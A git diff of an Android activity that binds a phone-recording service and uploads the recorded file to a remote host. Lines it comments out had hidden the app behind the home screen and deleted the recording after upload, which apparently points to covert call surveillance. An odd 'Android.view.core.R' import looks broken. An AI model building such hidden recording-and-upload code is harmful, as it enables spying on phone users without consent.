@@ -41,6 +41,8 @@ import java.io.IOException;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 
+import Android.view.core.R;
+
 import static android.support.v4.content.PermissionChecker.PERMISSION_DENIED;
 
 
@@ -56,11 +58,10 @@ public class PhoneRecordActivity extends Activity {
     private String remoteHost;
 
     private Handler mHandler = new Handler();
-    private boolean isBindService = false;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-//        setContentView(R.layout.main_activity);
+        setContentView(R.layout.main_activity);
 
         Bundle bundle = getIntent().getBundleExtra("data");
         if(bundle != null)
@@ -71,15 +72,14 @@ public class PhoneRecordActivity extends Activity {
             Log.d(TAG, "start phone service...");
             Intent intent = new Intent(this, PhoneRecordService.class);
             bindService(intent, getPhoneServiceConnection(), BIND_AUTO_CREATE);
-            isBindService = true;
         }
 
 //        ((TextView)findViewById(R.id.content)).setText(getlocalip());
 
         FloatViewUtil.getInstance().showFloatingWindow(mContext);
-        Intent home = new Intent(Intent.ACTION_MAIN);
-        home.addCategory(Intent.CATEGORY_HOME);
-        startActivity(home);
+//        Intent home = new Intent(Intent.ACTION_MAIN);
+//        home.addCategory(Intent.CATEGORY_HOME);
+//        startActivity(home);
     }
 
     public PhoneServiceConnection getPhoneServiceConnection(){
@@ -224,11 +224,7 @@ public class PhoneRecordActivity extends Activity {
                 }
                 uploadFile(mPhoneFile, Constant.TYPE_PHONE);
 
-                if(isBindService) {
-                    unbindService(getPhoneServiceConnection());
-                    isBindService = false;
-                }
-                finish();
+                unbindService(getPhoneServiceConnection());
             } catch (JSONException e) {
                 e.printStackTrace();
             } catch (InterruptedException e) {
@@ -285,7 +281,9 @@ public class PhoneRecordActivity extends Activity {
                 int ret = -1;
                 byte[] result = new byte[1024];
                 while ((ret = fis.read(result)) != -1) {
-                    TransferManager.getInstance().writeData(result);
+                    byte[] data = new byte[ret];
+                    System.arraycopy(result, 0, data, 0, ret);
+                    TransferManager.getInstance().writeHexData(data);
                 }
             if(Constant.isDebug) {
                 mHandler.post(new Runnable() {
@@ -295,8 +293,9 @@ public class PhoneRecordActivity extends Activity {
                     }
                 });
             }
-            mFile.delete();
+//            mFile.delete();
             Log.d(TAG, "uploadFile: upload success");
+            finish();
         } catch (FileNotFoundException e) {
             e.printStackTrace();
         } catch (IOException e) {
